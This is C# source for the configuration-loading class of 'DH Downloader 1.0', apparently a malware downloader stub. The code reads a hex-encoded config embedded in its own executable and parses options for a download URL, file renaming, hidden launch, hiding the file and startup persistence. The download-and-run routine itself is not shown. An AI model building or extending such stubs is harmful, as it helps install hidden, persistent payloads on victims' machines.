// DH Downloader 1.0
// (C) Doddy Hackman 2014

using System;
using System.Collections.Generic;
using System.Text;

using System.IO;
using System.Text.RegularExpressions;

namespace stub
{
    class load_config
    {
        string downloader_online_config = "";
        string url_config = "";
        string opcion_change_name_config = "";
        string text_change_name_config = "";
        string opcion_carga_normal_config = "";
        string opcion_carga_hide_config = "";
        string ruta_donde_bajar_config = "";
        string opcion_ocultar_archivo_config = "";
        string opcion_startup_config = "";

        public string downloader_online
        {
            set { downloader_online_config = value; }
            get { return downloader_online_config; }
        }

        public string url
        {
            set { url_config = value; }
            get { return url_config; }
        }

        public string opcion_change_name
        {
            set { opcion_change_name_config = value; }
            get { return opcion_change_name_config; }
        }

        public string text_change_name
        {
            set { text_change_name_config = value; }
            get { return text_change_name_config; }
        }

        public string opcion_carga_normal
        {
            set { opcion_carga_normal_config = value; }
            get { return opcion_carga_normal_config; }
        }

        public string opcion_carga_hide
        {
            set { opcion_carga_hide_config = value; }
            get { return opcion_carga_hide_config; }
        }

        public string ruta_donde_bajar
        {
            set { ruta_donde_bajar_config = value; }
            get { return ruta_donde_bajar_config; }
        }

        public string opcion_ocultar_archivo
        {
            set { opcion_ocultar_archivo_config = value; }
            get { return opcion_ocultar_archivo_config; }
        }

        public string opcion_startup
        {
            set { opcion_startup_config = value; }
            get { return opcion_startup_config; }
        }

        public string hexencode(string texto)
        {
            string resultado = "";

            byte[] enc = Encoding.Default.GetBytes(texto);
            resultado = BitConverter.ToString(enc);
            resultado = resultado.Replace("-", "");
            return "0x" + resultado;
        }

        public string hexdecode(string texto)
        {

            // Based on : http://snipplr.com/view/36461/string-to-hex----hex-to-string-convert/
            // Thanks to emregulcan

            string valor = texto.Replace("0x", "");
            string retorno = "";

            while (valor.Length > 0)
            {
                retorno = retorno + System.Convert.ToChar(System.Convert.ToUInt32(valor.Substring(0, 2), 16));
                valor = valor.Substring(2, valor.Length - 2);
            }

            return retorno.ToString();
        }

        public load_config()
        {
            string downloader_online_config = "";
            string url_config = "";
            string opcion_change_name_config = "";
            string text_change_name_config = "";
            string opcion_carga_normal_config = "";
            string opcion_carga_hide_config = "";
            string ruta_donde_bajar_config = "";
            string opcion_ocultar_archivo_config = "";
            string opcion_startup_config = "";
        }

        public void load_data()
        {
            StreamReader viendo = new StreamReader(System.Reflection.Assembly.GetEntryAssembly().Location);
            string contenido = viendo.ReadToEnd();
            Match regex = Regex.Match(contenido, "-63686175-(.*?)-63686175-", RegexOptions.IgnoreCase);

            if (regex.Success)
            {
                string comandos = regex.Groups[1].Value;
                if (comandos != "" || comandos != " ")
                {
                    downloader_online_config = "1";
                    string leyendo = hexdecode(comandos);

                    regex = Regex.Match(leyendo, "-url-(.*)-url-", RegexOptions.IgnoreCase);
                    if (regex.Success)
                    {
                        url_config = regex.Groups[1].Value;
                    }

                    regex = Regex.Match(leyendo, "-opcion_change_name-(.*)-opcion_change_name-", RegexOptions.IgnoreCase);
                    if (regex.Success)
                    {
                        opcion_change_name_config = regex.Groups[1].Value;
                    }

                    regex = Regex.Match(leyendo, "-text_change_name-(.*)-text_change_name-", RegexOptions.IgnoreCase);
                    if (regex.Success)
                    {
                        text_change_name_config = regex.Groups[1].Value;
                    }

                    regex = Regex.Match(leyendo, "-opcion_carga_normal-(.*)-opcion_carga_normal-", RegexOptions.IgnoreCase);
                    if (regex.Success)
                    {
                        opcion_carga_normal_config = regex.Groups[1].Value;
                    }

                    regex = Regex.Match(leyendo, "-opcion_carga_hide-(.*)-opcion_carga_hide-", RegexOptions.IgnoreCase);
                    if (regex.Success)
                    {
                        opcion_carga_hide_config = regex.Groups[1].Value;
                    }

                    regex = Regex.Match(leyendo, "-ruta_donde_bajar-(.*)-ruta_donde_bajar-", RegexOptions.IgnoreCase);
                    if (regex.Success)
                    {
                        ruta_donde_bajar_config = regex.Groups[1].Value;
                    }

                    regex = Regex.Match(leyendo, "-opcion_ocultar_archivo-(.*)-opcion_ocultar_archivo-", RegexOptions.IgnoreCase);
                    if (regex.Success)
                    {
                        opcion_ocultar_archivo_config = regex.Groups[1].Value;
                    }

                    regex = Regex.Match(leyendo, "-opcion_startup-(.*)-opcion_startup-", RegexOptions.IgnoreCase);
                    if (regex.Success)
                    {
                        opcion_startup_config = regex.Groups[1].Value;
                    }

                }
                else
                {
                    downloader_online_config = "0";
                }
            }

        }

        public string get_data()
        {
            string lista = "[+] Downloader Online : " + downloader_online_config + "\n" +
            "[+] URL : " + url_config +"\n" +
            "[+] Option Change Name : " + opcion_change_name_config + "\n" +
            "[+] Change Name to : " + text_change_name_config + "\n" +
            "[+] Option normal load : " + opcion_carga_normal_config + "\n" +
            "[+] Option hide load : " + opcion_carga_hide_config + "\n" +
            "[+] Path : " + ruta_donde_bajar_config + "\n" +
            "[+] Option hide file : " + opcion_ocultar_archivo_config + "\n" +
            "[+] Option startup : " + opcion_startup_config;

            //

            return lista;
        }
    

    }
}

// The End ?